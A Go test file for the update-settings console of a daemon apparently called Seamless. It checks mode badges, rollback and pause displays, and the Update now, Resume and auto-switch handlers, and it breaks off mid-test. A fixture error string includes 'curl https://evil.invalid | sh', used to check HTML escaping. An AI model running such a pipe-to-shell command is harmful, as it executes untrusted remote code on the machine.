package console

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/arctop/seamless/internal/config"
	"github.com/arctop/seamless/internal/core"
	"github.com/arctop/seamless/internal/store"
	"github.com/arctop/seamless/internal/update"
)

// autoBase is the file/env update block of a daemon that updates itself on
// the defaults: checks every 6h, a 24h soak and a 24h deadline.
var autoBase = config.Update{
	CheckInterval: config.Duration(6 * time.Hour),
	MaxDefer:      config.Duration(24 * time.Hour),
	MinAge:        config.Duration(24 * time.Hour),
}

// autoStatus is releaseStatus on a daemon that updates itself: an updater is
// wired, and the settings are autoBase merged with no override (checks and
// automatic updates on by default), so Mode is ModeAuto.
func autoStatus(now time.Time) update.Status {
	st := releaseStatus(now)
	st.CanApply = true
	st.Settings = update.Effective(autoBase, config.UpdateOverride{}, true)
	return st
}

// withNewer makes v0.7.3 the newest release, published the day before now and
// carrying the checksums bundle.
func withNewer(st *update.Status, now time.Time) {
	st.Newest = &update.Release{Version: ver(0, 7, 3), PublishedAt: now.Add(-30 * time.Hour), ChecksumsBundle: true}
	st.Available = true
}

// attemptErrorText stands for an updater's own error summary: owner-only text
// that may name paths and commands, and markup that must stay escaped.
const attemptErrorText = "rollback failed <b>badly</b>: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz"

// requestWithCanceledContext is an authenticated POST whose context has ended:
// the browser gave up waiting.
func requestWithCanceledContext(path string) *http.Request {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	req := httptest.NewRequestWithContext(ctx, http.MethodPost, path, nil)
	req.Header.Set("Authorization", "Bearer "+testKey)
	return req
}

func TestUpdatesSection_ModeWords(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		name   string
		status func() update.Status
		want   string
	}{
		{"automatic", func() update.Status { return autoStatus(now) }, `<span class="badge ok">Automatic</span>`},
		{"notify: no updater wired", func() update.Status { return releaseStatus(now) }, `<span class="badge ok">Notify</span>`},
		{"notify: paused", func() update.Status {
			st := autoStatus(now)
			st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now}
			return st
		}, `<span class="badge ok">Notify</span>`},
		{"off", func() update.Status {
			st := autoStatus(now)
			st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false)}, true)
			return st
		}, `<span class="badge">Off</span>`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := tc.status()
			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
			sec := updatesSection(t, mux)
			require.Contains(t, sec, tc.want)
			_, reason := st.Mode()
			require.Contains(t, sec, "<span>"+reason+"</span>")
		})
	}
}

// The rows and buttons for automatic updates, in each state that changes them.
func TestUpdatesSection_AutomaticUpdates(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		name   string
		base   config.Update
		mutate func(st *update.Status)
		want   []string
		absent []string
	}{
		{
			name: "up to date",
			base: autoBase,
			want: []string{
				"<dt>Automatic updates</dt>", `<span class="badge ok">on</span>`, "On by default: a new release installs by itself at a quiet moment.",
				"<dt>To update by hand</dt>",
				`<form method="post" action="/console/settings/updates/auto" aria-label="Automatic updates">`,
				`<input type="hidden" name="auto" value="off">`, "Turn automatic updates off",
				`<button class="btn small" type="submit" disabled title="No newer release is known">`, "Update now</button>",
			},
			absent: []string{"<dt>Next update</dt>", "confirm(", "/console/settings/updates/resume", "<dt>Last attempt</dt>"},
		},
		{
			name: "waiting for live sessions",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Target = st.Newest
				st.PendingSince = now.Add(-5 * time.Hour)
				st.WaitCode, st.Waiting = update.WaitSessions, "waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h"
			},
			want: []string{
				"<dt>Next update</dt>", `<strong class="mono">v0.7.3</strong>`,
				"<span>installs by itself: waiting for 2 live agent sessions to go idle, or at a lull in requests in 19h</span>",
				"pending since", "5h ago", "deadline in 19h",
				`onsubmit="return confirm('Install v0.7.3 now? The daemon restarts to finish, so agent sessions lose Seamless for a moment. This skips the soak and does not wait for agents to go idle.');"`,
				"Update to v0.7.3 now</button>",
			},
			absent: []string{"disabled title=\"No newer release"},
		},
		{
			name: "soaking",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Newest.PublishedAt = now.Add(-6 * time.Hour)
				st.WaitCode, st.Waiting = update.WaitSoak, "v0.7.3 waits out its 24h soak, about 18h to go"
			},
			want: []string{
				"<dt>Next update</dt>", "<span>installs by itself once it is 24h old</span>",
				"soak ends around " + ts(now.Add(18*time.Hour)),
			},
			absent: []string{"pending since"},
		},
		{
			name: "applying",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Stage: update.StageVerify, SpawnedAt: now.Add(-2 * time.Minute)}
				st.Target, st.WaitCode, st.Waiting = st.Newest, update.WaitInProgress, "updating to v0.7.3: verify"
			},
			want: []string{
				"<dt>Updating now</dt>", `<span class="badge accent">in progress</span>`, "v0.7.2 &rarr; v0.7.3",
				"<span>verifying the release</span>", `<span class="faint">automatic</span>`, "started 2m ago",
				`disabled title="An update is in progress"`,
			},
			absent: []string{"<dt>Next update</dt>", "confirm("},
		},
		{
			// The installer restarted the daemon on v0.7.3 before the record
			// moved past install: the row speaks from the new version's side.
			name: "confirming",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Version, st.Available = "0.7.3", false
				st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Stage: update.StageInstall, SpawnedAt: now.Add(-2 * time.Minute)}
			},
			want: []string{
				"<dt>Updating now</dt>", `<span class="badge ok">confirming</span>`, "v0.7.2 &rarr; v0.7.3",
				"<span>the new version is serving; the updater is confirming it</span>", "started 2m ago",
			},
			absent: []string{`<span class="badge accent">in progress</span>`, "running the installer"},
		},
		{
			name: "rolled back, blocked",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeRolledBack, Stage: update.StageRollback, RolledBack: true,
					Error: attemptErrorText, LogPath: "/data/update/logs/01M4.log", FoldedAt: now.Add(-20 * time.Minute)}
				st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now.Add(-20 * time.Minute)}}
				st.WaitCode, st.Waiting = update.WaitBlocked, "automatic updates skip v0.7.3: the update to it rolled back"
			},
			want: []string{
				"<dt>Last attempt</dt>", `<span class="badge warn">rolled back</span>`, "v0.7.2 &rarr; v0.7.3",
				"It failed after installing, and v0.7.2 was restored.",
				`<small class="updates-error updates-attempt-error">`,
				"rollback failed &lt;b&gt;badly&lt;/b&gt;: run curl https://evil.invalid | sh, backup at /tmp/x.tar.gz",
				`Log: <span class="mono">/data/update/logs/01M4.log</span>`,
				"<dt>Skipped releases</dt>", `<span class="mono">v0.7.3</span>: the update to it rolled back`,
				"Automatic updates skip these releases until a newer one is out; Resume does not clear them, and Update now does not skip them.",
				"Update to v0.7.3 now</button>",
			},
			absent: []string{"<b>badly</b>", "<dt>Next update</dt>", "/console/settings/updates/resume"},
		},
		{
			name: "paused",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Paused = &update.Pause{Reason: update.PauseRollbacks, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now.Add(-time.Hour)}
			},
			want: []string{
				`<span class="badge ok">Notify</span>`, "For now they paused themselves: see Paused below.",
				"<dt>Paused</dt>", `<span class="badge warn">paused</span>`,
				"Automatic updates paused themselves: two updates in a row rolled back (v0.7.3, v0.7.4).",
				`<form method="post" action="/console/settings/updates/resume">`, "Resume automatic updates</button>",
			},
			absent: []string{"<dt>Next update</dt>"},
		},
		{
			name: "held",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now.Add(-48 * time.Hour)}
				st.WaitCode, st.Waiting = update.WaitHeld, "v0.7.3 is held back: this install went back from v0.7.3"
			},
			want: []string{
				"<dt>Held back</dt>", `Releases up to <span class="mono">v0.7.3</span> are skipped: this install went back from <span class="mono">v0.7.3</span>.`,
				"Resume automatic updates</button>",
			},
			absent: []string{"<dt>Next update</dt>"},
		},
		{
			name: "interrupted, backing off",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeInterrupted, Stage: update.StageBackup, FoldedAt: now.Add(-20 * time.Minute)}
				st.Backoff = &update.Backoff{Until: now.Add(40 * time.Minute), Count: 2, Version: ver(0, 7, 3), Reason: update.OutcomeInterrupted}
			},
			want: []string{
				`<span class="badge warn">interrupted</span>`, "v0.7.2 still runs.",
				"<dt>Next try</dt>", "The attempt on v0.7.3 was interrupted (2 in a row); automatic updates try again",
				">in 40m</span>.",
			},
		},
		{
			name: "refused at the gates: a stale binary, with the owner's restart",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: update.RefusalStaleBinary,
					Error: "gates: the installed seamlessd is not v0.7.2", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want: []string{
				`<span class="badge warn">failed</span>`,
				"<small>It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed. " +
					"Restart the service so it runs the installed release: seamlessd restart.</small>",
				"gates: the installed seamlessd is not v0.7.2",
			},
		},
		{
			name: "refused at the gates from another version: what happened, no action",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: update.RefusalStaleBinary,
					Error: "gates: the installed seamlessd is not v0.7.1", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want:   []string{"<small>It stopped while checking it may install now: the installed seamlessd is not the version the daemon runs, so nothing changed.</small>"},
			absent: []string{"seamlessd restart"},
		},
		{
			name: "a refusal word from a newer updater reads as a plain failure",
			base: autoBase,
			mutate: func(st *update.Status) {
				withNewer(st, now)
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
					Outcome: update.OutcomeFailed, Stage: update.StageGates, Refusal: "disk_full",
					Error: "gates: the disk is full", FoldedAt: now.Add(-20 * time.Minute)}
			},
			want:   []string{"<small>It stopped while checking it may install now, before anything changed.</small>"},
			absent: []string{"disk_full", "seamlessd restart"},
		},
		{
			name: "applied with warnings",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 2), Why: update.WhyAuto,
					Outcome: update.OutcomeApplied, Stage: update.StageDone, Warnings: true,
					Error: "applied with warnings: hooks for Claude Code were not rewired", FoldedAt: now.Add(-time.Hour)}
			},
			want: []string{
				`<span class="badge warn">applied with warnings</span>`,
				"Run <span class=\"mono\">seamlessd install-hooks</span>", `data-copy="seamlessd install-hooks"`, "to re-wire your agents.",
				"applied with warnings: hooks for Claude Code were not rewired",
			},
		},
		{
			name: "a failed rollback names how to recover",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow,
					Outcome: update.OutcomeBroken, Stage: update.StageRollback, Error: "To recover:\n  1. reinstall v0.7.2", FoldedAt: now}
				st.Paused = &update.Pause{Reason: update.PauseBroken, Versions: []update.Version{ver(0, 7, 3)}, At: now}
			},
			want: []string{
				`<span class="badge danger">not rolled back</span>`, `<span class="faint">Update now</span>`,
				"could not be restored cleanly, so automatic updates paused themselves. The error below says how to recover.",
				"To recover:\n  1. reinstall v0.7.2", `<span class="badge danger">paused</span>`,
			},
		},
		{
			name: "update.auto: false in the config file",
			base: func() config.Update { b := autoBase; b.Auto = boolPtr(false); return b }(),
			mutate: func(st *update.Status) {
				b := autoBase
				b.Auto = boolPtr(false)
				st.Settings = update.Effective(b, config.UpdateOverride{Auto: boolPtr(true)}, true)
				withNewer(st, now)
			},
			want: []string{
				`<span class="badge ok">Notify</span>`, `<span class="badge">off</span>`,
				"Off: update.auto: false is set in the config file or environment, so this console cannot turn them on.",
				`<button class="btn small primary" type="submit" disabled title="Set in the config file or environment">Turn automatic updates on</button>`,
				"update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there.",
				"Update to v0.7.3 now</button>", // Update now works whatever update.auto says
			},
		},
		{
			name: "checks turned off in the console",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false), Auto: boolPtr(true)}, true)
			},
			want: []string{
				"Off while update checks are off: with no update traffic there is nothing to install.",
				`disabled title="Update checks are off"`, `<form id="updates-reset"`,
			},
			absent: []string{"/console/settings/updates/auto"},
		},
		{
			name: "automatic updates turned off in the console",
			base: autoBase,
			mutate: func(st *update.Status) {
				st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
			},
			want: []string{
				"Off: turned off in this console.", `<input type="hidden" name="auto" value="on">`,
				`<button class="btn small primary" type="submit">Turn automatic updates on</button>`,
				`class="settings-precedence is-override"`,
				"<strong>Automatic updates set in this console</strong> &mdash; That choice wins over the config file until you reset it; update checks follow the build&#39;s default.",
				`<form id="updates-reset" method="post" action="/console/settings/updates/reset"></form>`,
			},
			absent: []string{"Default for this build"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, _ := newUpdatesConsole(t, tc.base, &st)
			sec := updatesSection(t, mux)
			for _, want := range tc.want {
				require.Contains(t, sec, want)
			}
			for _, gone := range tc.absent {
				require.NotContains(t, sec, gone)
			}
		})
	}
}

// An install that cannot update itself gets none of the automatic-update
// controls: the mode line says why.
func TestUpdatesSection_NotifyOnlyInstallsGetNoAutoControls(t *testing.T) {
	now := time.Now()
	for name, mutate := range map[string]func(st *update.Status){
		"no updater wired": func(st *update.Status) { st.CanApply = false },
		"homebrew": func(st *update.Status) {
			st.Install = update.Install{Kind: update.KindHomebrew, Reason: "installed by Homebrew, which owns its files", Hint: update.Hint(update.KindHomebrew)}
		},
		"a build from source": func(st *update.Status) {
			st.Version, st.Distribution, st.Release = "0.0.0-dev", update.DistributionSource, false
			st.Install = update.Install{Kind: update.KindSource, Reason: "built from source (make install, go install or go build)", Hint: update.Hint(update.KindSource)}
		},
	} {
		t.Run(name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now}
			mutate(&st)
			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
			sec := updatesSection(t, mux)
			for _, gone := range []string{"<dt>Automatic updates</dt>", "/console/settings/updates/auto",
				"/console/settings/updates/apply", "/console/settings/updates/resume", "<dt>Held back</dt>", "To update by hand"} {
				require.NotContains(t, sec, gone)
			}
		})
	}
}

// Update now: a success says what started, and each refusal is its own
// message, built from the status the checker returned.
// TestUpdatesSection_SoakWordedOnce: the Mode line, the Next update row and the
// version fact's hover word update.min_age alike, with update.SpanWords. The
// two rows used to disagree on one page for a soak that is not a whole number
// of hours: "once they are 90m old" above "once it is 1h30m old".
func TestUpdatesSection_SoakWordedOnce(t *testing.T) {
	now := time.Now()
	base := autoBase
	base.MinAge = config.Duration(90 * time.Minute)
	st := autoStatus(now)
	st.Settings = update.Effective(base, config.UpdateOverride{}, true)
	withNewer(&st, now)
	st.Newest.PublishedAt = now.Add(-30 * time.Minute)
	st.WaitCode, st.Waiting = update.WaitSoak, "v0.7.3 waits out its 90m soak, about 1h to go"

	_, mux, _ := newUpdatesConsole(t, base, &st)
	sec := updatesSection(t, mux)
	require.Contains(t, sec, "installs new releases by itself once they are 90m old")
	require.Contains(t, sec, "<span>installs by itself once it is 90m old</span>")
	require.NotContains(t, sec, "1h30m")
	_, then := newestFate(st, now)
	require.Equal(t, "it installs by itself once it is 90m old", then)
}

func TestUpdatesApplyNow_Flashes(t *testing.T) {
	now := time.Now()
	applying := func(st update.Status) update.Status {
		st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow, SpawnedAt: now}
		return st
	}
	refuse := func(err error, mutate func(st *update.Status)) func(update.Status) (update.Status, error) {
		return func(st update.Status) (update.Status, error) {
			if mutate != nil {
				mutate(&st)
			}
			return st, err
		}
	}
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		applyNow  func(update.Status) (update.Status, error)
		wantParam string
		wantMsg   string
	}{
		{name: "started", applyNow: func(st update.Status) (update.Status, error) { return applying(st), nil },
			wantParam: "notice", wantMsg: "Updating to v0.7.3 (from v0.7.2). The daemon restarts to finish; this section shows how it went."},
		{name: "checks off", applyNow: refuse(update.ErrChecksOff, nil),
			wantParam: "error", wantMsg: "Update checks are off, so nothing was installed. Turn them on first."},
		{name: "cannot apply: no updater", mutate: func(st *update.Status) { st.CanApply = false },
			applyNow:  refuse(fmt.Errorf("%w: no updater is wired into this daemon", update.ErrCannotApply), nil),
			wantParam: "error", wantMsg: "Nothing was installed: this daemon does not install updates by itself (no updater is wired into this daemon). To update it, run seamlessd update."},
		{name: "cannot apply: homebrew", mutate: func(st *update.Status) {
			st.Install = update.Install{Kind: update.KindHomebrew, Reason: "installed by Homebrew, which owns its files", Hint: update.Hint(update.KindHomebrew)}
		}, applyNow: refuse(fmt.Errorf("%w: installed by Homebrew, which owns its files", update.ErrCannotApply), nil),
			wantParam: "error", wantMsg: "Nothing was installed: this daemon does not install updates by itself (installed by Homebrew, which owns its files). To update it, run brew upgrade --cask arctop/tap/seamless."},
		{name: "in progress", applyNow: refuse(update.ErrInProgress, func(st *update.Status) { *st = applying(*st) }),
			wantParam: "error", wantMsg: "An update to v0.7.3 is already in progress. This section shows how it goes."},
		{name: "in progress, an updater we did not start", applyNow: refuse(update.ErrInProgress, nil),
			wantParam: "error", wantMsg: "An update is already in progress. This section shows how it goes."},
		{name: "too soon", applyNow: refuse(update.ErrTooSoon, nil),
			wantParam: "error", wantMsg: "The last release check failed less than a minute ago, so nothing was installed. Try again in a minute."},
		{name: "up to date", applyNow: refuse(update.ErrUpToDate, nil),
			wantParam: "error", wantMsg: "Nothing to install: no release newer than v0.7.2 is known."},
		{name: "unsigned", applyNow: refuse(update.ErrUnsigned, func(st *update.Status) {
			withNewer(st, now)
			st.Newest.ChecksumsBundle = false
		}), wantParam: "error", wantMsg: "Nothing was installed: v0.7.3 carries no signed checksums bundle, which Update now verifies."},
		{name: "not running", applyNow: refuse(update.ErrNotRunning, nil),
			wantParam: "error", wantMsg: "The update checker is not running. Restart the daemon to revive it."},
		{name: "a failed re-check", applyNow: refuse(errors.New("update.Fetch: unexpected status 502 Bad Gateway"), nil),
			wantParam: "error", wantMsg: "Update now failed: update.Fetch: unexpected status 502 Bad Gateway"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, fake := newUpdatesConsole(t, autoBase, &st)
			fake.applyNow = tc.applyNow
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/apply", ""))
			require.Equal(t, tc.wantParam, param)
			require.Equal(t, tc.wantMsg, msg)
			require.Equal(t, 1, fake.applies)
		})
	}
}

// When the request stops waiting, the flash says the request gave up -- the
// command runs on in the checker.
func TestUpdatesApplyNowAndResume_RequestGaveUp(t *testing.T) {
	for _, tc := range []struct{ path, want string }{
		{"/console/settings/updates/apply", "Stopped waiting for Update now. It carries on; this section shows the update once it starts."},
		{"/console/settings/updates/resume", "Stopped waiting for the update checker. The resume carries on; this section shows the result."},
	} {
		st := autoStatus(time.Now())
		_, mux, fake := newUpdatesConsole(t, autoBase, &st)
		fake.applyNow = func(st update.Status) (update.Status, error) { return st, context.Canceled }
		fake.resume = func(st update.Status) (update.Status, error) { return st, context.Canceled }
		param, msg := locationOf(t, do(mux, requestWithCanceledContext(tc.path)))
		require.Equal(t, "error", param, tc.path)
		require.Equal(t, tc.want, msg)
	}
}

// Resume says what it lifted, and whether automatic updates can now run.
func TestUpdatesResume_SaysWhatItLifted(t *testing.T) {
	now := time.Now()
	pause := &update.Pause{Reason: update.PauseRollbacks, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now}
	hold := &update.Hold{Through: ver(0, 7, 4), From: ver(0, 7, 4), At: now}
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		resume    func(update.Status) (update.Status, error)
		wantParam string
		wantMsg   string
	}{
		{name: "the pause", mutate: func(st *update.Status) { st.Paused = pause },
			wantParam: "notice", wantMsg: "Lifted the pause (two updates in a row rolled back). Automatic updates can install new releases again."},
		{name: "the hold", mutate: func(st *update.Status) { st.Hold = hold },
			wantParam: "notice", wantMsg: "Lifted the hold on releases up to v0.7.4. Automatic updates can install new releases again."},
		{name: "both", mutate: func(st *update.Status) { st.Paused, st.Hold = pause, hold },
			wantParam: "notice", wantMsg: "Lifted the pause (two updates in a row rolled back) and the hold on releases up to v0.7.4. Automatic updates can install new releases again."},
		{name: "with automatic updates off", mutate: func(st *update.Status) {
			st.Hold = hold
			st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
		}, wantParam: "notice", wantMsg: "Lifted the hold on releases up to v0.7.4. Automatic updates are switched off, so nothing installs by itself until you turn them on."},
		{name: "nothing to lift",
			wantParam: "notice", wantMsg: "Nothing to resume: automatic updates were neither paused nor holding releases back."},
		{name: "not running", mutate: func(st *update.Status) { st.Paused = pause },
			resume:    func(st update.Status) (update.Status, error) { return st, update.ErrNotRunning },
			wantParam: "error", wantMsg: "The update checker is not running. Restart the daemon to revive it."},
		{name: "another failure", mutate: func(st *update.Status) { st.Paused = pause },
			resume:    func(st update.Status) (update.Status, error) { return st, errors.New("boom") },
			wantParam: "error", wantMsg: "Could not resume automatic updates: boom"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			if tc.mutate != nil {
				tc.mutate(&st)
			}
			_, mux, fake := newUpdatesConsole(t, autoBase, &st)
			fake.resume = tc.resume
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/resume", ""))
			require.Equal(t, tc.wantParam, param)
			require.Equal(t, tc.wantMsg, msg)
			require.Equal(t, 1, fake.resumes)
		})
	}
}

// The automatic-updates switch stores the console's Auto (keeping its Check),
// refuses "on" while the config file or environment keeps it off, and names
// the valid values for anything else.
func TestUpdatesAuto_StoresTheSwitch(t *testing.T) {
	now := time.Now()
	t.Run("off then on", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, fake := newUpdatesConsole(t, autoBase, &st)
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned off: new releases are still announced, and installing one is your call.", msg)
		o, found := storedOverride(t, db)
		require.True(t, found)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(false)}, o)
		require.False(t, fake.Status().Settings.Auto, "the checker re-read the stored switch")
		require.Equal(t, update.SourceConsole, fake.Status().Settings.AutoSource)

		sec := updatesSection(t, mux)
		require.Contains(t, sec, "Off: turned off in this console.", "the page the redirect lands on shows the new state")
		require.Contains(t, sec, "Turn automatic updates on")

		param, msg = locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. Seamless installs new releases by itself once they are 24h old, "+
			"when no agent session is live, or at a lull in requests after waiting 24h.", msg)
		o, _ = storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(true)}, o)
	})

	t.Run("an auto save keeps the stored Check, and a check save the stored Auto", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, _ := newUpdatesConsole(t, autoBase, &st)
		require.NoError(t, store.SetUpdateOverride(context.Background(), db, config.UpdateOverride{Check: boolPtr(false)}))
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. They apply once update checks are back on.", msg)
		o, _ := storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Check: boolPtr(false), Auto: boolPtr(true)}, o)

		param, _ = locationOf(t, postForm(mux, "/console/settings/updates", "check=on"))
		require.Equal(t, "notice", param)
		o, _ = storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Check: boolPtr(true), Auto: boolPtr(true)}, o)
	})

	t.Run("on, while automatic updates paused themselves", func(t *testing.T) {
		st := autoStatus(now)
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
		st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now}
		_, mux, _ := newUpdatesConsole(t, autoBase, &st)
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned on. They paused themselves earlier (two updates in a row rolled back): resume them to let them run again.", msg)
	})

	t.Run("on, on an install that does not update itself", func(t *testing.T) {
		st := releaseStatus(now)
		_, mux, _ := newUpdatesConsole(t, config.Update{}, &st)
		_, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
		require.Equal(t, "Automatic updates turned on. This install does not install releases by itself, so nothing changes here.", msg)
	})

	t.Run("an unreadable stored row is replaced", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, _ := newUpdatesConsole(t, autoBase, &st)
		require.NoError(t, store.SetSetting(context.Background(), db, store.SettingUpdateConfig, `{"auto":"yes"}`))
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Contains(t, msg, "The stored update setting was unreadable and has been replaced.")
		o, _ := storedOverride(t, db)
		require.Equal(t, config.UpdateOverride{Auto: boolPtr(false)}, o)
	})

	for _, tc := range []struct {
		name, body, want string
	}{
		{"missing", "", "auto is required: valid values are on, off"},
		{"not a value", "auto=yes", `auto invalid "yes": valid values are on, off`},
		{"empty", "auto=", `auto invalid "": valid values are on, off`},
		{"twice", "auto=on&auto=off", "auto must be given exactly once: valid values are on, off"},
		{"the check field instead", "check=on", "auto is required: valid values are on, off"},
	} {
		t.Run("refused: "+tc.name, func(t *testing.T) {
			st := autoStatus(now)
			db, mux, fake := newUpdatesConsole(t, autoBase, &st)
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", tc.body))
			require.Equal(t, "error", param)
			require.Equal(t, tc.want, msg)
			_, found := storedOverride(t, db)
			require.False(t, found, "nothing is stored")
			_, refreshes := fake.counts()
			require.Zero(t, refreshes)
		})
	}

	// Locked: the file or environment keeps automatic updates off.
	for _, tc := range []struct {
		name string
		base config.Update
		want string
	}{
		{"update.auto: false", func() config.Update { b := autoBase; b.Auto = boolPtr(false); return b }(),
			"Automatic updates stay off: update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there."},
		{"update.check: false", func() config.Update { b := autoBase; b.Check = boolPtr(false); return b }(),
			"Automatic updates stay off: update.check: false is set in the config file or SEAMLESS_UPDATE_CHECK; change it there."},
		{"both", func() config.Update { b := autoBase; b.Check, b.Auto = boolPtr(false), boolPtr(false); return b }(),
			"Automatic updates stay off: update.auto: false is set in the config file or SEAMLESS_UPDATE_AUTO; change it there."},
	} {
		t.Run("locked: "+tc.name, func(t *testing.T) {
			st := autoStatus(now)
			st.Settings = update.Effective(tc.base, config.UpdateOverride{}, true)
			require.True(t, st.Settings.AutoLocked)
			db, mux, fake := newUpdatesConsole(t, tc.base, &st)
			param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=on"))
			require.Equal(t, "error", param)
			require.Equal(t, tc.want, msg)
			_, found := storedOverride(t, db)
			require.False(t, found, "nothing is stored")
			_, refreshes := fake.counts()
			require.Zero(t, refreshes)

			// Off is never refused: the more restrictive setting wins anyway.
			param, _ = locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
			require.Equal(t, "notice", param)
		})
	}

	t.Run("a stopped checker picks the change up at the next start", func(t *testing.T) {
		st := autoStatus(now)
		db, mux, fake := newUpdatesConsole(t, autoBase, &st)
		fake.refreshErr = update.ErrNotRunning
		param, msg := locationOf(t, postForm(mux, "/console/settings/updates/auto", "auto=off"))
		require.Equal(t, "notice", param)
		require.Equal(t, "Automatic updates turned off: new releases are still announced, and installing one is your call. "+
			"The update checker is not running, so the change applies when the daemon next starts.", msg)
		_, found := storedOverride(t, db)
		require.True(t, found)
	})
}

// On an install that updates itself, Reset says where both switches landed.
func TestUpdatesReset_NamesBothSwitches(t *testing.T) {
	st := autoStatus(time.Now())
	db, mux, fake := newUpdatesConsole(t, autoBase, &st)
	require.NoError(t, store.SetUpdateOverride(context.Background(), db, config.UpdateOverride{Auto: boolPtr(false)}))
	_, err := fake.Refresh(context.Background())
	require.NoError(t, err)
	require.Contains(t, updatesSection(t, mux), `<form id="updates-reset"`, "a console Auto alone offers the reset")

	param, msg := locationOf(t, postForm(mux, "/console/settings/updates/reset", ""))
	require.Equal(t, "notice", param)
